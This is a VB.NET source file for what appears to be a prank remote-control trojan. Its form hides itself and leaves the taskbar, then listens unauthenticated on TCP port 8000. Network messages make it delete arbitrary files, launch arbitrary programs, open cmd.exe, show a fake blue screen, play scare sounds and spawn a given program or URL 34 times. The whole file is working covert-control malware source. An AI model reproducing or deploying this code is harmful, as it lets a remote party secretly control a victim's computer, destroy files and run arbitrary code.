Option Explicit On
Imports System.IO
Imports System.Net.Sockets

Public Class Form1
    Dim Listener As New TcpListener(8000)
    Dim Client As TcpClient

    Private Sub _FormClosing() Handles Me.FormClosing
        Listener.Stop()
    End Sub

    Private Sub _Load() Handles MyBase.Load
        Me.Visible = False
        Me.ShowInTaskbar = False
        Timer1.Start()
        Listener.Start()
    End Sub

    Private Sub _Tick() Handles Timer1.Tick
        Dim Message As String
        Dim nStart As Integer
        Dim nLast As Integer

        If Listener.Pending = True Then
            Message = ""
            Client = Listener.AcceptTcpClient()
            Dim Reader As New StreamReader(Client.GetStream())

            While Reader.Peek > -1
                Message &= Convert.ToChar(Reader.Read()).ToString
            End While

            If Message.Contains("</>") Then
                nStart = InStr(Message, "</>") + 4
                nLast = InStr(Message, "<\>")
                Message = Mid(Message, nStart, nLast - nStart)
                MsgBox(Message, MsgBoxStyle.Critical, "...")
            End If


            If Message = "cmd" Then
                Process.Start("C:\Windows\System32\cmd.exe")
            End If

            If Message = "fake bsod" Then
                Form2.Show()
                Form2.ProgressBar1.Value = 0
                Form2.Timer1.Start()
            End If

            If Message.Contains("<//>") Then
                nStart = InStr(Message, "<//>") + 4
                nLast = InStr(Message, "<\\>")
                Message = Mid(Message, nStart, nLast - nStart)
                My.Computer.FileSystem.DeleteFile(Message)
            End If

            If Message.Contains("<///>") Then
                Try
                    nStart = InStr(Message, "<///>") + 4
                    nLast = InStr(Message, "<\\\>")
                    Message = Mid(Message, nStart, nLast - nStart)
                    Process.Start(Message)
                Catch ex As Exception
                    MsgBox("eCode:333", MsgBoxStyle.Critical, "Error")
                End Try
            End If

            If Message = "jump" Then
                My.Computer.Audio.Play(My.Resources.scare, AudioPlayMode.Background)
            End If

            If Message = "ba" Then
                My.Computer.Audio.Play(My.Resources.badum, AudioPlayMode.Background)
            End If

            If Message.Contains("</yt>") Then
                Try
                    nStart = InStr(Message, "</yt>") + 4
                    nLast = InStr(Message, "<\yt>")
                    Message = Mid(Message, nStart, nLast - nStart)
                    Process.Start(Message)
                    Process.Start(Message)
                    Process.Start(Message)
                    Process.Start(Message)
                    Process.Start(Message)
                    Process.Start(Message)
                    Process.Start(Message)
                    Process.Start(Message)
                    Process.Start(Message)
                    Process.Start(Message)
                    Process.Start(Message)
                    Process.Start(Message)
                    Process.Start(Message)
                    Process.Start(Message)
                    Process.Start(Message)
                    Process.Start(Message)
                    Process.Start(Message)
                    Process.Start(Message)
                    Process.Start(Message)
                    Process.Start(Message)
                    Process.Start(Message)
                    Process.Start(Message)
                    Process.Start(Message)
                    Process.Start(Message)
                    Process.Start(Message)
                    Process.Start(Message)
                    Process.Start(Message)
                    Process.Start(Message)
                    Process.Start(Message)
                    Process.Start(Message)
                    Process.Start(Message)
                    Process.Start(Message)
                    Process.Start(Message)
                    Process.Start(Message)
                Catch ex As Exception

                End Try
            End If
        End If
    End Sub

    Private Sub Timer2_Tick(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Timer2.Tick

    End Sub
End Class